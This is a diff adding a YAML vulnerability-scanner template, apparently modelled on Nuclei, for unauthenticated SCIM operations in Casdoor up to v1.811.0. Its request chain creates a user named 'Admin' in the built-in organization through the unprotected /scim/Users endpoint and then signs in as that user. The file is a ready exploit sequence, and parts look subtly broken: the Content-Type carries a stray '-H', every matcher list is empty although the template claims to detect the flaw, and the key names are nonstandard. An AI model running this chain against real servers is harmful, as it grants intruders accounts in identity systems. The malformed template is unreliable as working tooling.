@@ -1,0 +1,31 @@
+id: casdoor-unauth-operations
+brief:
+    title: Casdoor <=v1.811.0 - Unauthenticated SCIM Operations
+    by: iamnoooob
+    level: critical
+    about: Detects unauthorized SCIM (System for Cross-domain Identity Management) operations in Casdoor versions ≤1.811.0, allowing unauthenticated access to user management functionalities.
+    label:
+        - casdoor
+        - unauth
+        - intrusive
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/scim/Users'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/scim/Users'
+      head:
+        Content-Type: application/scim+json-H
+      body: '{"active":true,"displayName":"Admin","emails":[{"value":"{{email}}"}],"password":"{{password}}","nickName":"{{username}}","schemas":["urn:ietf:params:scim:schemas:core:2.0:User","urn:ietf:params:scim:schemas:extension:enterprise:2.0:User"],"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User":{"organization":"built-in"},"userName":"{{username}}","userType":"normal-user"}'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/api/login'
+      head:
+        Content-Type: text/plain;charset=UTF-8
+      body: '{"application":"app-built-in","organization":"built-in","username":"{{username}}","autoSignin":true,"password":"{{password}}","signinMethod":"Password","type":"login"}'
+      signs: []
